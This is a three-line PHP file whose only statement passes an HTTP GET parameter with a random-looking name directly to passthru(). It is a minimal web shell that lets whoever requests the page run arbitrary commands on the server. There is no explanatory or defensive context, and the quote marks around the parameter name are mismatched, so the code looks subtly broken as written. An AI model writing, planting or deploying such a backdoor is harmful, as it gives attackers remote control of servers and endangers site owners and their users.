<?php
passthru($_GET[’f_tdM7TQ']);
?>
